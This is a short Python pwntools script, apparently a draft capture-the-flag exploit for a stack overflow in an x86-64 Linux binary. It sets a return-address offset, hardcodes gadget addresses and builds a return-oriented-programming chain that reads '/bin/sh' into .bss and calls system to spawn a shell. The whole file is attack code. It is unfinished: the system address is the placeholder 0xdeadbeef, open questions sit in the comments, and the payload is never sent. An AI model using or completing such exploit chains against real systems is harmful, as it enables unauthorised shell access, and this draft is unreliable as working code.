#!/usr/bin/python2

from pwn import *

context.update(arch='amd64', os='linux')

# Offsets relative to RBP
start_offset = -0x20
ret_offset   =  0x08
buf_size = ret_offset - start_offset

# Find libc offset (for system)
# Libc versions?

# There is some content in bss
bss = 0x602060 + 0x50

# Gadgets
system    = 0xdeadbeef # Calculate
get_input = 0x400794
pop_ret   = 0x400885

#
flat(
    get_input,  # Load /bin/sh from STDIN
    pop_ret,    # Return address
    bss,        # Destination    (arg1)
    0xcafebabe, # Amount to read (arg2), needed?
    system,     # System
    'AAAAAAAA', # Return address
    bss,
)
